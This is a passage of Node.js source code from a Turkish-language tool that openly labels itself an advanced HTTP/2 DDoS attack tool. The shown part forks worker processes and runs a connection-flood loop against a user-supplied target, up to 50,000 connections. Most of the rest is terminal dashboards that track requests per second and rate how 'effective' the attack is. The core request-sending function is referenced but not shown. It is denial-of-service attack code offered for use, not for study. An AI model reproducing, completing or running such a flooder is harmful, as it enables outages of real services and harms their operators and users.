╔══════════════════════════════════════════════════════════════════════════════════════╗
║                               🚀 SALDIRI BAŞLATILDI                                ║
║                         Füze.Plaşkov v2.1 (Standart) - x.com/paro                  ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
📊 Saldırı Bilgileri:
   🎯 Hedef: ${target}
   ⏱️  Süre: ${time} saniye
   🧵 Thread: ${threads}
   ⚡ Hız: ${ratelimit}/sn
   📡 HTTP: ${forceHttp == 1 ? 'HTTP/1.1' : forceHttp == 2 ? 'HTTP/2' : 'Karışık'}
   🔍 Debug: ${debugMode ? 'Aktif' : 'Pasif'}

💡 Daha iyi UI için: npm install blessed
`);
    }

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        let startTime = Date.now();
        let rpsHistory = [];
        let dashboard = null;
        
        // Dashboard'u güvenli şekilde başlat
        try {
            dashboard = blessed ? createDashboard() : createConsoleDashboard();
            console.log('📊 Dashboard başlatıldı: ' + (blessed ? 'Interactive Mode' : 'Console Mode'));
        } catch (error) {
            console.log('⚠️  Dashboard başlatma hatası, basit moda geçiliyor:', error.message);
            dashboard = createConsoleDashboard();
        }
        
        // Çıkış işleyicisi
        process.on('SIGINT', () => {
            console.log('\n🛑 Kullanıcı tarafından durduruldu...');
            if (dashboard && dashboard.destroy) {
                dashboard.destroy();
            }
            process.stdout.write('\x1b[2J\x1b[H'); // Ekranı temizle
            process.exit(0);
        });
        
        // Hata yakalayıcı
        process.on('uncaughtException', (error) => {
            if (dashboard && dashboard.destroy) {
                dashboard.destroy();
            }
            console.error('🚫 Kritik hata:', error.message);
            process.exit(1);
        });
        
        // İlk log
        if (dashboard && dashboard.log) {
            dashboard.log('🚀 Saldırı başlatıldı...');
            dashboard.log(`🎯 Hedef: ${target}`);
            dashboard.log(`🧵 Thread sayısı: ${threads}`);
            dashboard.log(`⚡ Hız limiti: ${ratelimit}/sn`);
            dashboard.log(`📡 HTTP protokol: ${forceHttp == 1 ? 'HTTP/1.1' : forceHttp == 2 ? 'HTTP/2' : 'Karışık'}`);
        }
        
        const updateInterval = setInterval(() => {
            try {
                let statuses = {}
                for (let w in workers) {
                    if (workers[w][0].state == 'online') {
                        for (let st of workers[w][1]) {
                            for (let code in st) {
                                if (statuses[code] == null)
                                    statuses[code] = 0

                                statuses[code] += st[code]
                            }
                        }
                    }
                }
                
                // Başarılı ve başarısız istekleri ayır
                const successCodes = {};
                const errorCodes = {};
                let totalSuccess = 0;
                let totalErrors = 0;
                
                for (let code in statuses) {
                    if (['200', '201', '202', '204', '301', '302', '304'].includes(code)) {
                        successCodes[code] = statuses[code];
                        totalSuccess += statuses[code];
                    } else {
                        errorCodes[code] = statuses[code];
                        totalErrors += statuses[code];
                    }
                }
                
                // RPS hesaplama ve geçmiş
                const elapsedSeconds = Math.max(1, (Date.now() - startTime) / 1000);
                const totalRequests = totalSuccess + totalErrors;
                const currentRPS = Math.floor(totalRequests / elapsedSeconds);
                const successRate = totalRequests > 0 ? ((totalSuccess / totalRequests) * 100).toFixed(1) : '0.0';
            
            // RPS geçmişini güncelle
            rpsHistory.push(currentRPS);
            if (rpsHistory.length > 120) rpsHistory.shift(); // Son 2 dakika
            
            // Status belirleme
            const effectiveStatus = totalSuccess > 100 ? 'ÇOK ETKİLİ 🔥' : totalSuccess > 10 ? 'ETKİLİ 🎯' : 'BAŞLANGIC ⏳';
            
            // Dashboard güncelle
            dashboard.update({
                target: target,
                activeThreads: Object.keys(workers).length,
                totalThreads: threads,
                protocol: forceHttp == 1 ? 'HTTP/1.1' : forceHttp == 2 ? 'HTTP/2' : 'Karışık',
                elapsed: Math.floor(elapsedSeconds),
                totalTime: time,
                currentRPS: currentRPS,
                totalRequests: totalRequests,
                totalSuccess: totalSuccess,
                totalErrors: totalErrors,
                successRate: successRate,
                status: effectiveStatus,
                successCodes: successCodes,
                errorCodes: errorCodes,
                rpsHistory: rpsHistory
            });
            
            // Önemli olayları logla
            if (dashboard.log) {
                const prevTotal = rpsHistory.length > 1 ? rpsHistory[rpsHistory.length - 2] * (elapsedSeconds - 1) : 0;
                const newRequests = totalRequests - prevTotal;
                
                if (newRequests > 0) {
                    dashboard.log(`📊 ${newRequests} yeni istek gönderildi (RPS: ${currentRPS})`);
                }
                
                // Yüksek hata oranında uyarı
                if (totalRequests > 50 && parseFloat(successRate) < 10) {
                    dashboard.log(`⚠️  Düşük başarı oranı tespit edildi: %${successRate}`);
                }
                
                // GOAWAY frame tespit edildiğinde
                if (errorCodes['GOAWAY'] && errorCodes['GOAWAY'] > 0) {
                    dashboard.log(`🚫 GOAWAY frame tespit edildi - Server bağlantıları sonlandırıyor`);
                }
                
                // Başarılı milestone'lar
                if (totalSuccess === 100) {
                    dashboard.log('🎉 100 başarılı istek milestone\'ına ulaşıldı!');
                } else if (totalSuccess === 1000) {
                    dashboard.log('� 1000 başarılı istek milestone\'ına ulaşıldı!');
                } else if (totalSuccess === 10000) {
                    dashboard.log('💥 10,000 başarılı istek milestone\'ına ulaşıldı!');
                }
            }
            
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0
    const maxConnections = Math.min(50000, threads * 2000); // Dinamik bağlantı limiti

    let i = setInterval(() => {
        if (conns < maxConnections) {
            conns++
            // Flood mode için ek bağlantılar
            if (connection_flood_mode && conns % 10 === 0) {
                for (let j = 0; j < 3; j++) {
                    setTimeout(() => go(), j * 10);
                }
            }
        } else {
            clearInterval(i)
            return
        }
        go()
    }, Math.max(1, delay));

    // Connection flood modunu belirli aralıklarla aktifleştir
    setInterval(() => {
        connection_flood_mode = !connection_flood_mode;
    }, 30000);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}

// Gelişmiş Dashboard Fonksiyonu - Tamamen Düzeltilmiş Layout
function createDashboard() {
    if (!blessed) return null;
    
    const screen = blessed.screen({
        smartCSR: true,
        autoPadding: false,
        title: 'Füze.Plaşkov v2.1 - Advanced DDoS Dashboard',
        dockBorders: false,  
        fullUnicode: true
    });

    // Header - Sabit yükseklik
    const header = blessed.box({
        parent: screen,
        top: 0,
        left: 0,
        width: '100%',
        height: 3,
        content: '{center}{bold}🚀 Füze.Plaşkov v2.1 - Advanced HTTP/2 Attack Tool{/bold}{/center}',
        style: {
            bg: 'blue',
            fg: 'white'
        },
        tags: true,
        border: {
            type: 'line',
            fg: 'blue'
        }
    });

    // Target Info Box - Sol üst
    const targetBox = blessed.box({
        parent: screen,
        top: 3,
        left: 0,
        width: '50%-1',  // Biraz boşluk bırak
        height: 6,
        border: {
            type: 'line',
            fg: 'green'
        },
        label: ' 🎯 Hedef Bilgileri ',
        content: 'Bağlantı kuruluyor...',
        style: {
            bg: 'black',
            fg: 'green'
        },
        tags: true,
        padding: { left: 1, right: 1, top: 0, bottom: 0 }
    });

    // Attack Stats Box - Sağ üst  
    const statsBox = blessed.box({
        parent: screen,
        top: 3,
        left: '50%',
        width: '50%',
        height: 6,
        border: {
            type: 'line',
            fg: 'yellow'
        },
        label: ' ⚡ Saldırı İstatistikleri ',
        content: 'Hazırlanıyor...',
        style: {
            bg: 'black',
            fg: 'yellow'
        },
        tags: true,
        padding: { left: 1, right: 1, top: 0, bottom: 0 }
    });

    // Success Codes Box - Sol orta
    const successBox = blessed.box({
        parent: screen,
        top: 9,
        left: 0,
        width: '50%-1',
        height: 8,
        border: {
            type: 'line',
            fg: 'green'
        },
        label: ' ✅ Başarılı İstekler ',
        content: 'Veri bekleniyor...',
        scrollable: true,
        alwaysScroll: true,
        style: {
            bg: 'black',
            fg: 'green'
        },
        tags: true,
        padding: { left: 1, right: 1, top: 0, bottom: 0 }
    });

    // Error Codes Box - Sağ orta
    const errorBox = blessed.box({
        parent: screen,
        top: 9,
        left: '50%',
        width: '50%',
        height: 8,
        border: {
            type: 'line',
            fg: 'red'
        },
        label: ' ❌ Hatalar ve Engeller ',
        content: 'Sistem izleniyor...',
        scrollable: true,
        alwaysScroll: true,
        style: {
            bg: 'black',
            fg: 'red'
        },
        tags: true,
        padding: { left: 1, right: 1, top: 0, bottom: 0 }
    });

    // Performance Graph Box - Tam genişlik orta
    const graphBox = blessed.box({
        parent: screen,
        top: 17,
        left: 0,
        width: '100%',
        height: 6,
        border: {
            type: 'line',
            fg: 'magenta'
        },
        label: ' 📊 Performans Grafiği ',
        content: 'Grafik hazırlanıyor...',
        style: {
            bg: 'black',
            fg: 'magenta'
        },
        tags: true,
        padding: { left: 1, right: 1, top: 0, bottom: 0 }
    });

    // Log Box - Alt kısım, dinamik yükseklik
    const logBox = blessed.log({
        parent: screen,
        top: 23,
        left: 0,
        width: '100%',
        height: '100%-25',  // Status bar için yer bırak
        border: {
            type: 'line',
            fg: 'cyan'
        },
        label: ' 📋 Sistem Logları ',
        scrollable: true,
        alwaysScroll: true,
        mouse: true,
        style: {
            bg: 'black',
            fg: 'white'
        },
        tags: true,
        padding: { left: 1, right: 1, top: 0, bottom: 0 }
    });

    // Status bar - En alt
    const statusBar = blessed.box({
        parent: screen,
        bottom: 0,
        left: 0,
        width: '100%',
        height: 1,
        content: '{center}[ESC/Q/Ctrl+C: Çıkış] [TAB: Gezinme] [↑↓: Scroll]{/center}',
        style: {
            bg: 'white',
            fg: 'black',
            bold: true
        },
        tags: true
    });

    // Key bindings - Daha gelişmiş kontroller
    screen.key(['escape', 'q', 'C-c'], function(ch, key) {
        process.stdout.write('\x1b[2J\x1b[H'); // Ekrani temizle
        console.log('🛑 Saldırı durduruldu. Çıkış yapılıyor...');
        screen.destroy();
        process.exit(0);
    });

    // Scroll kontrolleri
    screen.key(['up', 'k'], function() {
        if (screen.focused && screen.focused.scroll) {
            screen.focused.scroll(-1);
            screen.render();
        }
    });

    screen.key(['down', 'j'], function() {
        if (screen.focused && screen.focused.scroll) {
            screen.focused.scroll(1);
            screen.render();
        }
    });

    // Tab ile gezinme
    screen.key(['tab'], function() {
        const focusables = [successBox, errorBox, logBox];
        const current = focusables.indexOf(screen.focused);
        const next = (current + 1) % focusables.length;
        focusables[next].focus();
        screen.render();
    });

    // Initial focus
    successBox.focus();
    screen.render();

    return {
        screen,
        targetBox,
        statsBox,
        successBox,
        errorBox,
        graphBox,
        logBox,
        update: function(data) {
            try {
                // Target bilgileri güncelle - daha kompakt
                const targetContent = 
                    `🎯 {bold}${(data.target || 'N/A').substring(0, 28)}{/bold}\n` +
                    `🧵 Thread: {bold}${data.activeThreads || 0}/${data.totalThreads || 0}{/bold}\n` +
                    `🌐 ${data.protocol || 'HTTP/2'} | ⏱️ ${data.elapsed || 0}s/${data.totalTime || 0}s\n` +
                    `🔄 Durum: {bold}${data.status || 'BAŞLIYOR'}{/bold}`;
                
                targetBox.setContent(targetContent);

                // Stats güncelle - renkli göstergeler
                const successRate = data.totalRequests > 0 ? ((data.totalSuccess / data.totalRequests) * 100).toFixed(1) : '0.0';
                const statusColor = parseFloat(successRate) > 70 ? 'green' : parseFloat(successRate) > 30 ? 'yellow' : 'red';
                const rpsColor = (data.currentRPS || 0) > 1000 ? 'green' : (data.currentRPS || 0) > 100 ? 'yellow' : 'white';
                
                const statsContent = 
                    `🚀 RPS: {bold}{${rpsColor}-fg}${data.currentRPS || 0}{/}\n` +
                    `📊 İstek: {bold}${data.totalRequests || 0}{/bold}\n` +
                    `✅ Başarı: {bold}{${statusColor}-fg}%${successRate}{/}\n` +
                    `⚔️ Etki: {bold}${(data.totalSuccess || 0) > 100 ? '{green-fg}YÜKSEK{/}' : (data.totalSuccess || 0) > 10 ? '{yellow-fg}ORTA{/}' : '{red-fg}DÜŞÜK{/}'}{/bold}`;
                
                statsBox.setContent(statsContent);

                // Success codes güncelle - daha görsel
                let successContent = '';
                if (data.successCodes && Object.keys(data.successCodes).length > 0) {
                    const sortedSuccess = Object.entries(data.successCodes)
                        .sort(([,a], [,b]) => b - a)
                        .slice(0, 5);
                    
                    sortedSuccess.forEach(([code, count]) => {
                        const percentage = data.totalSuccess > 0 ? ((count / data.totalSuccess) * 100).toFixed(1) : '0.0';
                        const maxCount = Math.max(...Object.values(data.successCodes));
                        const barLength = Math.min(Math.floor((count / maxCount) * 12), 12);
                        const bar = '█'.repeat(barLength);
                        const emoji = code === '200' ? '✅' : code === '204' ? '🟢' : code === '301' ? '🔄' : '📡';
                        successContent += `${emoji} ${code}: {bold}${count}{/bold} (${percentage}%)\n{green-fg}${bar}{/}\n`;
                    });
                    successContent += `\n{bold}{green-fg}TOPLAM: ${data.totalSuccess || 0} ✨{/}`;
                } else {
                    successContent = '⏳ Başarılı istekler bekleniyor...\n\n🔄 Bağlantılar kuruluyor\n⚡ Saldırı hazırlanıyor';
                }
                successBox.setContent(successContent);

                // Error codes güncelle - daha detaylı
                let errorContent = '';
                if (data.errorCodes && Object.keys(data.errorCodes).length > 0) {
                    const sortedErrors = Object.entries(data.errorCodes)
                        .sort(([,a], [,b]) => b - a)
                        .slice(0, 5);
                    
                    sortedErrors.forEach(([code, count]) => {
                        const percentage = data.totalErrors > 0 ? ((count / data.totalErrors) * 100).toFixed(1) : '0.0';
                        const maxCount = Math.max(...Object.values(data.errorCodes));
                        const barLength = Math.min(Math.floor((count / maxCount) * 10), 10);
                        const bar = '▓'.repeat(barLength);
                        
                        let emoji = '⚠️';
                        if (code === 'GOAWAY') emoji = '🚫';
                        else if (code === '403') emoji = '🔒';
                        else if (code === '404') emoji = '❓';
                        else if (code === '500') emoji = '💥';
                        else if (code === '503') emoji = '🛡️';
                        else if (code.startsWith('4')) emoji = '🔒';
                        else if (code.startsWith('5')) emoji = '💥';
                        else if (code.includes('TIMEOUT')) emoji = '⏰';
                        else if (code.includes('RESET')) emoji = '🔄';
                        
                        errorContent += `${emoji} ${code}: {bold}${count}{/bold} (${percentage}%)\n{red-fg}${bar}{/}\n`;
                    });
                    errorContent += `\n{bold}{red-fg}TOPLAM: ${data.totalErrors || 0} 🚨{/}`;
                } else {
                    errorContent = '🌟 Henüz hata yok!\n\n✨ Sistem stabil\n🎯 Hedef yanıt veriyor';
                }
                errorBox.setContent(errorContent);

                // Performance graph güncelle - geliştirilmiş grafik
                if (data.rpsHistory && data.rpsHistory.length > 1) {
                    const maxRPS = Math.max(...data.rpsHistory, 1);
                    const avgRPS = Math.floor(data.rpsHistory.reduce((a,b) => a+b, 0) / data.rpsHistory.length);
                    const minRPS = Math.min(...data.rpsHistory);
                    
                    let graphContent = `📈 RPS Trend (Son ${Math.min(data.rpsHistory.length, 60)} saniye):\n\n`;
                    
                    // Gelişmiş ASCII grafik - 4 seviye
                    const lastValues = data.rpsHistory.slice(-25); // Son 25 değer
                    const height = 4;
                    
                    for (let level = height; level > 0; level--) {
                        const threshold = (maxRPS / height) * level;
                        let line = '';
                        lastValues.forEach(rps => {
                            if (rps >= threshold) {
                                line += rps >= maxRPS * 0.8 ? '█' : rps >= maxRPS * 0.6 ? '▆' : rps >= maxRPS * 0.4 ? '▄' : '▂';
                            } else {
                                line += ' ';
                            }
                        });
                        graphContent += `${line} ${Math.floor(threshold)}\n`;
                    }
                    
                    // İstatistikler
                    const trend = data.rpsHistory.length > 5 ? 
                        (data.rpsHistory.slice(-3).reduce((a,b) => a+b, 0) / 3) > avgRPS ? ' 📈' : ' 📉' : ' ➡️';
                    
                    graphContent += `\n🔥 Maks: {bold}{green-fg}${maxRPS}{/} | 📊 Ort: {bold}{yellow-fg}${avgRPS}{/} | 📉 Min: {bold}{cyan-fg}${minRPS}{/}${trend}`;
                    graphBox.setContent(graphContent);
                } else {
                    graphBox.setContent('📊 Grafik verisi toplanıyor...\n\n⚡ Performans sensörleri aktif\n🔄 İlk veriler alınıyor\n📈 Trend analizi başlayacak');
                }

                // Render with error handling
                if (screen && !screen.destroyed) {
                    screen.render();
                }
            } catch (error) {
                // Sessizce hataları geç, dashboard kararlılığı için
                if (error.message && !error.message.includes('Cannot read property')) {
                    console.error('Dashboard güncelleme hatası:', error.message);
                }
            }
        },
        log: function(message) {
            try {
                if (logBox && !screen.destroyed) {
                    const timestamp = new Date().toLocaleTimeString('tr-TR', { 
                        hour12: false,
                        hour: '2-digit',
                        minute: '2-digit', 
                        second: '2-digit'
                    });
                    
                    // Mesajı renklendir
                    let coloredMessage = message;
                    if (message.includes('✅') || message.includes('başarılı')) {
                        coloredMessage = `{green-fg}${message}{/}`;
                    } else if (message.includes('❌') || message.includes('hata')) {
                        coloredMessage = `{red-fg}${message}{/}`;
                    } else if (message.includes('⚠️') || message.includes('uyarı')) {
                        coloredMessage = `{yellow-fg}${message}{/}`;
                    } else if (message.includes('🔄') || message.includes('bağlan')) {
                        coloredMessage = `{cyan-fg}${message}{/}`;
                    }
                    
                    logBox.log(`{gray-fg}[${timestamp}]{/} ${coloredMessage}`);
                    
                    if (screen && !screen.destroyed) {
                        screen.render();
                    }
                }
            } catch (error) {
                // Sessizce log hatalarını geç
            }
        },
        destroy: function() {
            try {
                if (screen && !screen.destroyed) {
                    screen.destroy();
                }
            } catch (error) {
                // Temizlik hataları önemli değil
            }
        }
    };
}

// Geliştirilmiş Console Dashboard - Daha stabil ve temiz
function createConsoleDashboard() {
    return {
        update: function(data) {
            try {
                // Terminal boyutlarını güvenli şekilde al
                const termWidth = Math.min(process.stdout.columns || 80, 120);
                const boxWidth = termWidth - 4;
                
                // Ekranı temizle ve cursor'u yukarı taşı
                process.stdout.write('\x1b[2J\x1b[H');
                
                // Unicode box drawing karakterleri
                const topBorder = '╔' + '═'.repeat(boxWidth) + '╗';
                const midBorder = '╠' + '═'.repeat(boxWidth) + '╣';
                const bottomBorder = '╚' + '═'.repeat(boxWidth) + '╝';
                const emptyLine = '║' + ' '.repeat(boxWidth) + '║';
                
                // Header
                console.log(topBorder);
                console.log(`║${' '.repeat(Math.floor((boxWidth - 37) / 2))}🚀 Füze.Plaşkov v2.1 - Advanced DDoS Tool${' '.repeat(Math.ceil((boxWidth - 37) / 2))}║`);
                console.log(`║${' '.repeat(Math.floor((boxWidth - 19) / 2))}${new Date().toLocaleString('tr-TR')}${' '.repeat(Math.ceil((boxWidth - 19) / 2))}║`);
                console.log(midBorder);
                
                // Target ve temel bilgiler
                const targetText = `🎯 Hedef: ${(data.target || 'N/A').substring(0, Math.max(10, boxWidth - 20))}`;
                console.log(`║ ${targetText}${' '.repeat(Math.max(0, boxWidth - targetText.length - 1))}║`);
                
                const statsText = `🧵 ${data.activeThreads || 0}/${data.totalThreads || 0} | ⚡ ${data.currentRPS || 0} RPS | 📊 %${(data.successRate || '0.0')}`;
                console.log(`║ ${statsText}${' '.repeat(Math.max(0, boxWidth - statsText.length - 1))}║`);
                console.log(emptyLine);
                
                // Durum göstergesi
                const effectiveStatus = (data.totalSuccess || 0) > 100 ? 'ÇOK ETKİLİ 🔥' : 
                                      (data.totalSuccess || 0) > 10 ? 'ETKİLİ 🎯' : 'BAŞLANGIC ⏳';
                const statusText = `🎯 Durum: ${effectiveStatus}`;
                console.log(`║ ${statusText}${' '.repeat(Math.max(0, boxWidth - statusText.length - 1))}║`);
                console.log(midBorder);
                
                // Başarılı istekler bölümü
                const successTitle = '✅ BAŞARILI İSTEKLER';
                console.log(`║${' '.repeat(Math.floor((boxWidth - successTitle.length) / 2))}${successTitle}${' '.repeat(Math.ceil((boxWidth - successTitle.length) / 2))}║`);
                console.log(midBorder);
                
                if (data.successCodes && Object.keys(data.successCodes).length > 0) {
                    const sortedSuccess = Object.entries(data.successCodes)
                        .sort(([,a], [,b]) => b - a)
                        .slice(0, 4); // Sadece ilk 4'ü göster
                    
                    sortedSuccess.forEach(([code, count]) => {
                        const percentage = data.totalSuccess > 0 ? ((count / data.totalSuccess) * 100).toFixed(1) : '0.0';
                        const maxWidth = Math.max(20, boxWidth - 30);
                        const barLength = Math.min(Math.floor((count / Math.max(...Object.values(data.successCodes))) * maxWidth), maxWidth);
                        const bar = '█'.repeat(barLength);
                        const emoji = code === '200' ? '✅' : code === '204' ? '🟢' : '📡';
                        
                        const line1 = ` ${emoji} HTTP ${code}: ${count} (%${percentage})`;
                        console.log(`║${line1}${' '.repeat(Math.max(0, boxWidth - line1.length))}║`);
                        
                        if (barLength > 0) {
                            const line2 = ` ${bar}`;
                            console.log(`║${line2}${' '.repeat(Math.max(0, boxWidth - line2.length))}║`);
                        }
                    });
                    
                    const totalLine = ` 🟢 TOPLAM BAŞARILI: ${data.totalSuccess || 0} ✨`;
                    console.log(`║${totalLine}${' '.repeat(Math.max(0, boxWidth - totalLine.length))}║`);
                } else {
                    console.log(`║ ⏳ Başarılı istekler bekleniyor...${' '.repeat(Math.max(0, boxWidth - 30))}║`);
                }
                
                console.log(midBorder);
                
                // Hata bölümü
                const errorTitle = '❌ HATA VE ENGELLER';
                console.log(`║${' '.repeat(Math.floor((boxWidth - errorTitle.length) / 2))}${errorTitle}${' '.repeat(Math.ceil((boxWidth - errorTitle.length) / 2))}║`);
                console.log(midBorder);
                
                if (data.errorCodes && Object.keys(data.errorCodes).length > 0) {
                    const sortedErrors = Object.entries(data.errorCodes)
                        .sort(([,a], [,b]) => b - a)
                        .slice(0, 4); // Sadece ilk 4'ü göster
                    
                    sortedErrors.forEach(([code, count]) => {
                        const percentage = data.totalErrors > 0 ? ((count / data.totalErrors) * 100).toFixed(1) : '0.0';
                        let emoji = code === 'GOAWAY' ? '🚫' : code === '403' ? '🔒' : code === '503' ? '�️' : '⚠️';
                        
                        const errorLine = ` ${emoji} ${code}: ${count} (%${percentage})`;
                        console.log(`║${errorLine}${' '.repeat(Math.max(0, boxWidth - errorLine.length))}║`);
                    });
                    
                    const totalErrorLine = ` 🔴 TOPLAM HATA: ${data.totalErrors || 0}`;
                    console.log(`║${totalErrorLine}${' '.repeat(Math.max(0, boxWidth - totalErrorLine.length))}║`);
                } else {
                    console.log(`║ ✨ Henüz hata yok - Mükemmel!${' '.repeat(Math.max(0, boxWidth - 27))}║`);
                }
                
                console.log(midBorder);
                
                // Özet istatistik
                const summaryTitle = '📈 ÖZET İSTATİSTİK';
                console.log(`║${' '.repeat(Math.floor((boxWidth - summaryTitle.length) / 2))}${summaryTitle}${' '.repeat(Math.ceil((boxWidth - summaryTitle.length) / 2))}║`);
                console.log(midBorder);
                
                const statusIcon = parseFloat(data.successRate || 0) > 70 ? '🟢' : 
                                 parseFloat(data.successRate || 0) > 30 ? '🟡' : '🔴';
                
                const summaryLine1 = ` 📊 Toplam: ${data.totalRequests || 0} | RPS: ${data.currentRPS || 0} | Başarı: %${data.successRate || '0.0'} ${statusIcon}`;
                console.log(`║${summaryLine1}${' '.repeat(Math.max(0, boxWidth - summaryLine1.length))}║`);
                
                const uptime = Math.floor((data.elapsed || 0) / 60);
                const timeInfo = ` ⏰ Süre: ${uptime}dk | Etki: ${effectiveStatus}`;
                console.log(`║${timeInfo}${' '.repeat(Math.max(0, boxWidth - timeInfo.length))}║`);
                
                console.log(bottomBorder);
                console.log('💡 Çıkış için Ctrl+C tuşlayın\n');
                
            } catch (error) {
                // Basit fallback
                console.clear();
                console.log('🚀 Füze.Plaşkov v2.1 - DDoS Tool');
                console.log('================================');
                console.log(`Hedef: ${data.target || 'N/A'}`);
                console.log(`RPS: ${data.currentRPS || 0} | Başarı: %${data.successRate || '0.0'}`);
                console.log(`Toplam İstek: ${data.totalRequests || 0}`);
                console.log(`Durum: ${data.status || 'ÇALIŞIYOR'}`);
                console.log('================================\n');
            }
        },
        log: function(message) {
            // Console dashboard için log fonksiyonu - minimal
            // Ana display'i bozmamak için logları skip ediyoruz
        },
        destroy: function() {
            // Console için özel temizlik gerekmez
        }
    };
}